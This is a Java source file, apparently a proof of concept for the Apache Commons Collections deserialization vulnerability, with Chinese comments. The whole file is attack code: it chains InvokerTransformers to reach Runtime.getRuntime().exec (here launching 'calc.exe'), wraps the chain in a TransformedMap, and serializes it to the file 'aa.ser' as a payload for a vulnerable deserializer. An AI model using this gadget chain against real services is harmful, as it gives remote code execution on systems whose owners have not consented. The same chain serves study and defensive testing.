import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.HashMap;
import java.util.Map;

public class TestWriteObject {
    public void testWriteObject() throws IOException {
        //transformer链
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[] {String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke",
                        new Class[] {Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] {String.class }, new Object[] {"calc.exe"})};
        //能够执行代码的ChainedTransformer
        Transformer transformedChain = new ChainedTransformer(transformers);
        SerObj serObj=new SerObj();
        Map<String,String> beforeMap = new HashMap<String,String>();
        beforeMap.put("1", "test");
        Map afterMap = TransformedMap.decorate(beforeMap, null, transformedChain);
        //将我们精心设计的map传入
        serObj.map=afterMap;
        FileOutputStream fos =new FileOutputStream("aa.ser");
        ObjectOutputStream os=new ObjectOutputStream(fos);
        os.writeObject(serObj);
        os.close();
    }
}
